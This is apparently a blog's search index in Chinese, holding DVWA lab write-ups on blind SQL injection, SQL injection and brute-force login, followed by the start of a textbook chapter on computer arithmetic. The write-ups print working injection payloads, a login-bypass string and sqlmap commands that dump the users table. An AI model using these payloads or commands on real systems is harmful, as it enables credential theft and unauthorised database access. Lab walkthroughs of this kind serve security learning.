<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL Injection (Blind)</title>
      <link href="/p/9a2ec24c.html"/>
      <url>/p/9a2ec24c.html</url>
      
        <content type="html"><![CDATA[<h1>SQL Injection (Blind)（SQL 盲注）</h1><p>盲注部分的源码与 SQL Injection 一致，只不过将查询内容不是直接返回，变成了只返回是否存在。就要通过这一特性来设置 payload 猜测要注入的部分。</p><h2 id="Low">Low</h2><h3 id="Boolean盲注"><strong>Boolean盲注</strong></h3><ul><li><p>获取数据库名</p><ol><li><p>首先获取长度 <code>1' and length(database())&gt;3#</code></p> <img src="/p/9a2ec24c/image-20221122084525099.png" class title="image-20221122084525099"><p>长度大于3</p><p>再输入 <code>1' and length(database())&gt;4#</code></p> <img src="/p/9a2ec24c/image-20221122084609351.png" class title="image-20221122084609351"><p>长度小于等于4</p><p>所以用户名长度为 4</p></li><li><p>利用 ASCII 码猜测数据库的名称</p><p>首先猜测第一个字母 <code>1' and substr(database(),1,1)='a'#</code></p> <img src="/p/9a2ec24c/image-20221122084737886.png" class title="image-20221122084737886"><p>可以看到不是 <code>a</code></p><p>再试 <code>1' and substr(database(),1,1)='d'#</code></p> <img src="/p/9a2ec24c/image-20221122084825800.png" class title="image-20221122084825800"><p>第一个字母是 d</p><p>同理猜测其他的字母，第二个字母是 <code>1' and substr(database(),2,1)='v'#</code></p><p>其余的类似，不再赘述。 实际上做时，要写脚本或使用sqlmap，不然工作量太大，写脚本也不会按照ASCII表去一个个的尝试，可以先判断字符是不是字母，使用二分查找等方法。</p></li></ol></li></ul><h3 id="利用-sqlmap">利用 sqlmap</h3><p>sqlmap 下载地址：<a href="https://sqlmap.org/">https://sqlmap.org/</a></p><p>爆库过程如下：</p><p>首先 <code>F12</code> 命令行输入 <code>document.cookie</code> 将 <code>cookie</code> 复制下来，下面命令要用到</p> <img src="/p/9a2ec24c/image-20221122094022687.png" class title="image-20221122094022687"><p>获取当前数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=mhga8h7pbbs7lm9bu9pc1hrbfg; security=low&quot; --technique B --current-db    </span><br></pre></td></tr></table></figure> <img src="/p/9a2ec24c/image-20221122091741164.png" class title="image-20221122091741164"><p>dvwa数据库所有表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=mhga8h7pbbs7lm9bu9pc1hrbfg; security=low&quot; --technique B --tables -D dvwa</span><br></pre></td></tr></table></figure> <img src="/p/9a2ec24c/image-20221122091857245.png" class title="image-20221122091857245"><p>dvwa数据库users表所有列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=mhga8h7pbbs7lm9bu9pc1hrbfg; security=low&quot; --technique B --columns -D dvwa -T users</span><br></pre></td></tr></table></figure> <img src="/p/9a2ec24c/image-20221122092051656.png" class title="image-20221122092051656"><p>dvwa数据库users表user和password列内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=mhga8h7pbbs7lm9bu9pc1hrbfg; security=low&quot; --technique B --dump -D dvwa -T users -C &quot;user,password&quot;</span><br></pre></td></tr></table></figure> <img src="/p/9a2ec24c/image-20221122092231011.png" class title="image-20221122092231011"><p>成功！</p><h2 id="Medium">Medium</h2><p>利用 sqlmap，首先用 <code>burp suite</code> 抓包，然后将抓包的内容保存到 <code>1.txt</code> 文件中，然后使用命令依次获取信息</p> <img src="/p/9a2ec24c/image-20221122093429803.png" class title="image-20221122093429803"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获得当前数据库：</span><br><span class="line">python sqlmap.py -r &quot;./1.txt&quot; --technique B --current-db</span><br><span class="line"></span><br><span class="line">获得dvwa数据库所有表：</span><br><span class="line">python sqlmap.py -r &quot;./1.txt&quot; --technique B -D dvwa --tables </span><br><span class="line"></span><br><span class="line">获得dvwa数据库users表的所有列：</span><br><span class="line">python sqlmap.py -r &quot;./1.txt&quot; --technique B -D dvwa -T users --columns </span><br><span class="line"></span><br><span class="line">获得dvwa数据库users表user和password列所有内容：</span><br><span class="line">python sqlmap.py -r &quot;./1.txt&quot; --technique B -D dvwa -T users -C &quot;user,password&quot; --dump</span><br></pre></td></tr></table></figure> <img src="/p/9a2ec24c/image-20221122093530243.png" class title="image-20221122093530243"><h2 id="High">High</h2><p>这关使用sqlmap主要注意要比low关增加一个参数 <code>--level 2</code>，这样才会检测cookie中是否包含注入点（默认–level 1，不检测cookie）</p><img src="/p/9a2ec24c/image-20221122094553648.png" class title="image-20221122094553648"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当前数据库：</span><br><span class="line">python sqlmap.py -u &quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/&quot; --cookie &quot;id=1; PHPSESSID=mhga8h7pbbs7lm9bu9pc1hrbfg; security=high&quot; --technique B --level 2 --current-db</span><br><span class="line"></span><br><span class="line">dvwa数据库所有表：</span><br><span class="line">python sqlmap.py -u &quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/&quot; --cookie &quot;id=1; PHPSESSID=mhga8h7pbbs7lm9bu9pc1hrbfg; security=high&quot; --technique B --level 2 --tables -D dvwa</span><br><span class="line"></span><br><span class="line">dvwa数据库users表所有列：</span><br><span class="line">python sqlmap.py -u &quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/&quot; --cookie &quot;id=1; PHPSESSID=mhga8h7pbbs7lm9bu9pc1hrbfg; security=high&quot; --technique B --level 2 --columns -D dvwa -T users</span><br><span class="line"></span><br><span class="line">dvwa数据库users表user和password列所有内容：</span><br><span class="line">python sqlmap.py -u &quot;http://localhost/DVWA-master/vulnerabilities/sqli_blind/&quot; --cookie &quot;id=1; PHPSESSID=mhga8h7pbbs7lm9bu9pc1hrbfg; security=high&quot; --technique B --level 2 --dump -D dvwa -T users -C &quot;user,password&quot;</span><br></pre></td></tr></table></figure> <img src="/p/9a2ec24c/image-20221122094934953.png" class title="image-20221122094934953"><p>成功</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection</title>
      <link href="/p/7aecf8ff.html"/>
      <url>/p/7aecf8ff.html</url>
      
        <content type="html"><![CDATA[<h1>SQL Injection（SQL 注入攻击）</h1><h2 id="套路">套路</h2><p><strong>注入思路：</strong></p><ol><li>是否有注入？是字符型还是数字型</li><li>获取当前数据库<ul><li>获取库名</li><li>获取表名</li><li>获取列名</li></ul></li><li>下载（显示数据）</li></ol><h2 id="LOW">LOW</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;SQLI_DB&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> MYSQL:</span><br><span class="line">            <span class="comment">// Check database</span></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get results</span></span><br><span class="line">            <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">                <span class="comment">// Get values</span></span><br><span class="line">                <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SQLITE:</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$sqlite_db_connection</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#$sqlite_db_connection = new SQLite3($_DVWA[&#x27;SQLITE_DB&#x27;]);</span></span><br><span class="line">            <span class="comment">#$sqlite_db_connection-&gt;enableExceptions(true);</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">            <span class="comment">#print $query;</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$results</span> = <span class="variable">$sqlite_db_connection</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Caught exception: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$results</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$results</span>-&gt;<span class="title function_ invoke__">fetchArray</span>()) &#123;</span><br><span class="line">                    <span class="comment">// Get values</span></span><br><span class="line">                    <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                    <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Feedback for end user</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Error in fetch &quot;</span>.<span class="variable">$sqlite_db</span>-&gt;<span class="title function_ invoke__">lastErrorMsg</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>代码分析：</strong><br>服务器端的low.php并没有对客户输入的id进行任何检查与过滤，直接将SQL语句的执行结果显示给客户端。</p><ul><li>判断是否存在注入，注入是字符型还是数字型</li></ul><p>字符型和数字型的区别在于是否存在引号，因此通过输入 <code>1’</code> 进行注入，如下图：</p> <img src="/p/7aecf8ff/image-20221122064032279.png" class title="image-20221122064032279"><p>由上图可以判定id为注入点，且属于字符型注入，因此可以通过添加引号结束之前的SQL语句并在后面加上payload，最后在结尾通过 <code>#</code>注释掉代码中原有的引号(判断SQL注入类型的目的就是为了有针对性的结束原有语句)。</p><ul><li>猜解SQL查询语句中的字段数</li></ul><p>想要爆库要通过Union查询，先来了解一下Union查询吧：</p><blockquote><p>在大多数开发中，使用一条SELECT查询就会返回一个结果集。如果，我们想一次性查询多条SQL语句，并将每一条SELECT查询的结果合并成一个结果集返回。就需要用到Union操作符，将多个SELECT语句组合起来，这种查询被称为并（Union）或者复合查询。</p></blockquote><p>需要知道前一个select所查询的字段数目才能正确的进行Union查询。</p><p>尝试通过order by 判断前一个select语句的字段数，依次输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1#</span></span><br><span class="line"><span class="string">1&#x27;</span> order by <span class="number">2</span><span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3#</span></span><br></pre></td></tr></table></figure><p>当输入 <code>1' order by 3#</code> 可以看到如下提示，说明前一个select语句的查询字段数为2</p> <img src="/p/7aecf8ff/image-20221122064615395.png" class title="image-20221122064615395"><p>于是输入 <code>1' union select 1,2#</code></p> <img src="/p/7aecf8ff/image-20221122064755821.png" class title="image-20221122064755821"><ul><li>第二个select语句是可控且结果是可显示的，因此可以利用一些mysql函数获取数据库的相关信息，如version(),database()等。<ol><li>获取当前数据库，输入<code>1' union select database(),2#</code>，显示结果为:</li></ol></li></ul> <img src="/p/7aecf8ff/image-20221122064958846.png" class title="image-20221122064958846"><p>​2. 可知数据库名称为dvwa，同理获取当前的数据库版本，<code>1' union select version(),2#</code></p> <img src="/p/7aecf8ff/image-20221122065045465.png" class title="image-20221122065045465"><ul><li>获取数据库中的表</li></ul><p>如何根据数据库得知其中的数据表呢，这就需要了解mysql的一个小知识点了，每一个mysql都存在一个系统库information_schema，里面有mysql的“骨架”即所有的数据库，数据表，相应的字段名</p><p>可以构造 payload: <code>1' UNION SELECT 1,table_name from information_schema.tables where table_schema='dvwa'#</code></p> <img src="/p/7aecf8ff/image-20221122070716016.png" class title="image-20221122070716016"><p>遇到了问题，经过查找，发现是数据库编码问题，输入下面命令解决</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure> <img src="/p/7aecf8ff/image-20221122070809328.png" class title="image-20221122070809328"><p>结论：有两个表 guestbook、users</p><p><font color="blue">还是重新处理一下数据库吧，太麻烦了</font></p> <img src="/p/7aecf8ff/image-20221122072408728.png" class title="image-20221122072408728"> <img src="/p/7aecf8ff/image-20221122072600309.png" class title="image-20221122072600309"> <img src="/p/7aecf8ff/image-20221122072800490.png" class title="image-20221122072800490"> <img src="/p/7aecf8ff/image-20221122072925633.png" class title="image-20221122072925633"> <img src="/p/7aecf8ff/image-20221122073026256.png" class title="image-20221122073026256"><p><code>users</code> 同理</p><img src="/p/7aecf8ff/image-20221122073201551.png" class title="image-20221122073201551"><p>这样就可以正常使用了，不用进行编码格式的转换</p><ul><li>获取表中的字段名</li></ul><p>继续在mysql的”骨架”(information_schema)中寻找数据表对应的字段，输入 <code>1' union select column_name,2 from information_schema.columns where table_name=7573657273 #</code></p> <img src="/p/7aecf8ff/image-20221122071233721.png" class title="image-20221122071233721"><ul><li>显示数据</li></ul><p>有了数据表名和字段名，输入<code>1' union select user,password from users #</code></p> <img src="/p/7aecf8ff/image-20221122071543560.png" class title="image-20221122071543560"><h2 id="Medium">Medium</h2><ul><li>改用POST方式提交数据</li><li>对id进行了 <code>mysqli_real_escape_string</code> 转义处理</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。(包括’,”,\n,\r,\x00,\x1a)，但是细看medium.php中SQL语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br></pre></td></tr></table></figure><p>数字型注入</p><p>用 <code>burp suite</code> 抓取包，将最后一行注入 <code> UNION SELECT 1,database() from information_schema.schemata*#*</code></p><p>即变成 <code>id=1 UNION SELECT 1,database() from information_schema.schemata#&amp;Submit=Submit</code></p> <img src="/p/7aecf8ff/image-20221122074808660.png" class title="image-20221122074808660"><p>使用 <code>burp suite</code> 注入命令 <code>id=1 union select user,password from users #&amp;Submit=Submit</code></p> <img src="/p/7aecf8ff/image-20221122075237158.png" class title="image-20221122075237158"><p>可以看到成功了</p> <img src="/p/7aecf8ff/image-20221122075041116.png" class title="image-20221122075041116"><h2 id="High">High</h2><p>看源码，发现多了 <code>LIMIT 1</code></p><img src="/p/7aecf8ff/image-20221122075447719.png" class title="image-20221122075447719"><p>查找其含义</p> <img src="/p/7aecf8ff/image-20221122075626525.png" class title="image-20221122075626525"><p>似乎除了做了个弹窗，和 Low 好像是一样的，输入 <code>1' union select user,password from users #</code> ，则破解成功</p> <img src="/p/7aecf8ff/image-20221122080256760.png" class title="image-20221122080256760">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Brute Force</title>
      <link href="/p/cb9860d2.html"/>
      <url>/p/cb9860d2.html</url>
      
        <content type="html"><![CDATA[<h1>Brute Force(暴力破解)</h1><h2 id="Low">Low</h2><p>首先看一下源码，提取出关键部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">--- </span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">---</span><br><span class="line">    &#125;</span><br><span class="line">---</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到想从数据库中获取数据，就需要满足 <code>if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 )</code> ，即只要满足 <code>$query</code> 查询语句等于 1 ，即可从数据库中获取不为空的 <code>$result</code> ，破解就成功了。</p><p>可以看到破解的关键语句在这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE user = <span class="string">&#x27;$user&#x27;</span> AND password = <span class="string">&#x27;$pass&#x27;</span>;</span><br></pre></td></tr></table></figure><p>破解的关键在于，不知道 <code>$pass</code> 于是想办法把 AND 避开，只需要将用户名输入为 <code>admin' or '1'='1</code> ，替代 <code>$user</code> 后的效果如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE user = <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span> AND password = <span class="string">&#x27;$pass&#x27;</span>;</span><br></pre></td></tr></table></figure><p>可以看到根据逻辑连接词的执行顺序，or之后的语句都被跳过了，破解成功，拿到了数据库中的图片。</p> <img src="/p/cb9860d2/image-20221121131657192.png" class title="image-20221121131657192"><h2 id="Medium">Medium</h2><p>查看源码，发现在读取用户名和密码的地方加入了一行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br></pre></td></tr></table></figure><p>影响我们注入的关键是 <code>mysqli_real_escape_string</code> ，这个函数的作用是转移字符，也就是说，Low 级别下的 <code>'</code> 不能不能用了，使用 <code>burp suite</code> 爆破</p><p>这里注意 <code>burp suite</code> 的使用，要使用内置浏览器才能抓到 <code>localhost</code> 的内容，我真傻，试了一下午加一晚上。。。</p><p>配置ip和端口，我这里 <code>8080</code> 端口被占用了，这里使用 <code>8081</code> 端口</p> <img src="/p/cb9860d2/image-20221121231037608.png" class title="image-20221121231037608"><p>在内置浏览器中打开 <code>DVWA</code> ，输入用户名和密码，可以看到 <code>burp suite</code> 捕捉到了包</p> <img src="/p/cb9860d2/image-20221121231353552.png" class title="image-20221121231353552"><p>发送到爆破模块，然后清除全部变量，再对username和password添加变量进行暴力破解，并设置爆破类型。</p><p>爆破类型分四种：Sniper（狙击手）、Battering ram（攻城锤）、Pitchfork（草叉模式）、Cluster bomb（集束炸弹）。</p><p>根据不同的爆破需求选择使用，这里假设用户名和密码都未知，使用 Cluster bomb ，可以同时将用户名和密码爆出来</p> <img src="/p/cb9860d2/image-20221121231538336.png" class title="image-20221121231538336"><p>将我们要测试的部分用 <code>$ $</code> 标出来</p> <img src="/p/cb9860d2/image-20221121233251288.png" class title="image-20221121233251288"><p>可以搜索变量的字典用来匹配，这里为了方便，简单的输入几个样例来匹配测试</p><img src="/p/cb9860d2/image-20221121233552898.png" class title="image-20221121233552898"><p>可以看到正确用户名和密码的组合长度要大于其他的组合，由此可以判断出正确的结果</p> <img src="/p/cb9860d2/image-20221121233657056.png" class title="image-20221121233657056"><p>不过为什么空字符也是正确的呢？因为在抓包时输入的是正确的用户名和密码，会有一次原字符提交，第一次的提交是正确的。</p><h2 id="High">High</h2><p>根据源码可以知道，这个级别对爆破攻击有一定的防护作用，但是也有疏忽的地方。</p><p>这个级别要校验token,每次都需要更新token。使用mysqli_real_escape_string(str)函数，而且完全的抵抗了SQL的注入。</p><p>切换到 high level 同样的方法抓包，发送给 <code>Intruder</code></p> <img src="/p/cb9860d2/image-20221121234715964.png" class title="image-20221121234715964"> <img src="/p/cb9860d2/image-20221121235246406.png" class title="image-20221121235246406"><p>playload1 还是用 simple list</p> <img src="/p/cb9860d2/image-20221122001047963.png" class title="image-20221122001047963"><img src="/p/cb9860d2/image-20221121235316917.png" class title="image-20221121235316917">  <img src="/p/cb9860d2/image-20221122000425073.png" class title="image-20221122000425073"><img src="/p/cb9860d2/image-20221122000316280.png" class title="image-20221122000316280"> <img src="/p/cb9860d2/image-20221122000543663.png" class title="image-20221122000543663"><p>开始爆破，爆破结果如下</p> <img src="/p/cb9860d2/image-20221122000822994.png" class title="image-20221122000822994">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六章-计算机的运算方法</title>
      <link href="/p/5593d197.html"/>
      <url>/p/5593d197.html</url>
      
        <content type="html"><![CDATA[<h1>第六章 计算机的运算方法</h1><h2 id="一、-无符号数和有符号数">一、 无符号数和有符号数</h2><p>计算机中的数均放在寄存器中</p><p>机器字长：寄存器的位数</p><h3 id="1-有符号数">1.有符号数</h3><h4 id="1-1-机器数与真值">1.1 机器数与真值</h4><table><thead><tr><th>机器数</th><th>真值（带符号的数）</th><th>小数点位置</th></tr></thead><tbody><tr><td>0 1011</td><td>+0.1011</td><td>符号位后面</td></tr><tr><td>1 1011</td><td>-0.1011</td><td>符号位后面</td></tr><tr><td></td><td></td><td></td></tr><tr><td>0 1100</td><td>+1100</td><td>数值后面</td></tr><tr><td>1 1100</td><td>-1100</td><td>数值后面</td></tr></tbody></table><h4 id="1-2-原码表示">1.2 原码表示</h4><ul><li>正数不变</li><li><strong>负数符号位置 1</strong></li><li>有表示不同的+0和-0</li></ul><p>$$<br>[x]_原 =<br>\begin{cases}<br>0,x &amp; 2^n &gt; x \geq 0 \<br>2^n - x &amp; 0 \geq x &gt; -2^n<br>\end{cases}<br>$$</p><p>$$<br>[x]_原 =<br>\begin{cases}<br>x &amp; 1 &gt; x \geq 0 \<br>1-x &amp; 0 \geq x &gt; -1<br>\end{cases}<br>$$</p><h4 id="1-3-补码">1.3 补码</h4><ul><li>正数不变</li><li><strong>负数除符号位取反 +1 